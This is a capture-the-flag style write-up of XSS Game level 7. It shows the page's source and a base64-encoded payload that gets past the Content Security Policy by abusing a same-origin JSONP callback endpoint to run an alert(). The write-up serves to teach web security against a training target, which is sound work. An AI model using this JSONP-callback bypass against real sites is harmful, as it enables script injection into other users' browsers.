# **XSSGame Level 7**

![](https://i.imgur.com/09DogdF.png)
CSP = Content Security Policy

First, we take a look at index.php
## index.php
```
<html>
  <head>
    <script src="/static/js/js_frame.js"></script>
  </head>
  <body align="center" bgColor="white">
    
    <a href="?menu=YWJvdXQ=">About Me</a>
    <!-- Image source: https://pixabay.com/en/construction-safety-site-banner-1174806/ License: Public Domain -->
    <a href="?menu=Y2F0cw==">Cats</a>
    <!-- Image source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ License: Public Domain -->
    <!-- Image source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ License: Public Domain -->
    <a href="?menu=ZG9ncw==">Dogs</a>
    <!-- Image source: https://pixabay.com/en/goggles-dog-canine-pet-vacation-1472479/ License: Public Domain -->
    <!-- Image source: https://pixabay.com/en/dog-sidecar-sunglasses-funny-171773/ License: Public Domain -->
    <script src="/static/js/level7.js"></script>
  </body>
</html>
```
Here's some `herf` : About Me`"?menu=YWJvdXQ="`, Cats`"?menu=Y2F0cw=="`, Dogs`"?menu=ZG9ncw=="`.

Cause to `==`, I guess they're Base64Encoded.

Then we take a look to JS file in last line:`<script src="/static/js/level7.js"></script>`.

## level7.js
```
/**
 * Ask server side what to display.
 */
function main() {
    var m = location.search.match('menu=(.*)');
    var menu = m ? atob(m[1]) : 'about';
    document.write('<script src="jsonp?menu=' + encodeURIComponent(menu) + '"></script>');
}

/**
 * Display stuff returned from server side.
 * @param {string} data - JSON data from server side
 */
function callback(data) {
    if (data.title) document.write('<h1>' + data.title + '</h1>');
    if (data.pictures) data.pictures.forEach(function(url) {
        document.write('<img src="/static/img/' + url + '"><br><br>');
    });
}

main();
```

First, we try some basic test for base64.

In web console:
```
> btoa('123')
< "MTIz"
```

![](https://i.imgur.com/kreHCNc.png)

Yap, it's base64.

Then we try to inject XSS:
```
> btoa('<script> alert();</script>')
< "PHNjcmlwdD4gYWxlcnQoKTs8L3NjcmlwdD4="
```
![](https://i.imgur.com/8uhkwaK.png)
![](https://i.imgur.com/5Q6gjtD.png)
Failed.
OK, here we got the title `CSP` ;)

We take a look to more detail in JSONP:
## JSON Data
![](https://i.imgur.com/YDBFeqz.png)

After we search some [vulnerabilities on JSONP](https://blog.csdn.net/jnu_simba/article/details/43241483), we found `jsonp?callback=` is really risky to be exploited.

![](https://i.imgur.com/iPfXHUA.png)

If you inject XSS like following, it will be reaturn in begining.

![](https://i.imgur.com/r1TTcA6.png)

Althoough we get return javascript, we need someone to excute this feedback, `menu=`

In web console:
```
> btoa("<script src='jsonp?callback=alert()%3B+%2F%2F'></script>")
< "PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IrJTJGJTJGJz48L3NjcmlwdD4="
```

![](https://i.imgur.com/C0vYktM.png)

You'll see, first, `index.php` receive `jsonp` = `callback({"title":"Error, no such menu: <script src='jsonp?callback=alert()%3B+%2F%2F'></script>"})`

Then `document.write('<h1>' + data.title + '</h1>');` in `level7.js` write down `<h1>Error, no such menu: <script src="jsonp?callback=alert()%3B+%2F%2F"></script></h1>`

`<script src="jsonp?callback=alert()%3B+%2F%2F"></script>` will be excuted.

The return of `jsonp?callback=alert()%3B+%2F%2F` : `alert(); //({"title":"Welcome to my Website!","pictures":["const.png"]})` = `alert();` will be excute as javascript.

![](https://i.imgur.com/HCivW4t.png)

Fin.
